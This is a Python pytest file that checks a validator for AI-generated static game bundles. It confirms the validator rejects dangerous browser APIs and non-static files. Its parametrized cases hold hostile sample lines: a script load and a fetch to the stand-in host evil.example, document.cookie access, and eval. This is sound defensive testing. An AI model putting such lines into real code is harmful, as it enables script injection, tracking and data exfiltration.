import json

import pytest

from app.agent.state import GeneratedFiles
from app.agent.validator import ArtifactValidationError, validate_generated_files


def _bundle(**overrides: str) -> GeneratedFiles:
    files = {
        "index.html": '<!doctype html><html><head><link rel="stylesheet" href="style.css"></head><body><script src="game.js"></script></body></html>',
        "style.css": "body{margin:0}",
        "game.js": "const score = 0;",
        "manifest.json": json.dumps(
            {
                "schemaVersion": "1.0",
                "entry": "index.html",
                "title": "安全测试游戏",
                "description": "validator test bundle",
                "files": ["index.html", "style.css", "game.js"],
                "runtime": "iframe-html-v1",
            },
            ensure_ascii=False,
        ),
    }
    files.update(overrides)
    return GeneratedFiles(files=files, manifest={})


@pytest.mark.parametrize(
    ("file_name", "content", "message"),
    [
        ("index.html", '<script src="http://evil.example/x.js"></script>', "外部脚本"),
        ("index.html", '<script src="//evil.example/x.js"></script>', "外部脚本"),
        ("game.js", "eval('alert(1)')", "eval"),
        ("game.js", "new Function('return 1')", "Function"),
        ("game.js", "Function('alert(1)')", "Function"),
        ("game.js", "localStorage.setItem('x','1')", "localStorage"),
        ("game.js", "sessionStorage.setItem('x','1')", "sessionStorage"),
        ("game.js", "document.cookie", "document.cookie"),
        ("game.js", "fetch('https://evil.example/track')", "fetch"),
        ("game.js", "new XMLHttpRequest()", "XMLHttpRequest"),
    ],
)
def test_validator_rejects_dangerous_runtime_apis(file_name: str, content: str, message: str):
    with pytest.raises(ArtifactValidationError, match=message):
        validate_generated_files(_bundle(**{file_name: content}))


def test_validator_rejects_non_static_artifact_files():
    with pytest.raises(ArtifactValidationError, match="只允许静态 HTML/CSS/JS/manifest"):
        validate_generated_files(_bundle(**{"sprite.svg": "<svg></svg>"}))


def test_validator_allows_safe_function_keyword():
    """function 关键字（小写 f）是安全的，Function 构造器（大写 F）才应被拦截"""
    safe_codes = [
        "function startGame() { console.log('hello'); }",
        "var $ = function(id) { return document.getElementById(id); }",
        "function() { return true; }",
        "canvas.getContext('2d')",
        "var fn = function() { return 1; }",
    ]
    for code in safe_codes:
        validate_generated_files(_bundle(**{"game.js": code}))  # 不抛异常 = 通过


def test_validator_rejects_manifest_referencing_non_static_files():
    manifest = {
        "schemaVersion": "1.0",
        "entry": "index.html",
        "title": "安全测试游戏",
        "description": "validator test bundle",
        "files": ["index.html", "style.css", "game.js", "sprite.svg"],
        "runtime": "iframe-html-v1",
    }

    with pytest.raises(ArtifactValidationError, match="manifest files 只允许"):
        validate_generated_files(_bundle(**{"manifest.json": json.dumps(manifest, ensure_ascii=False)}))
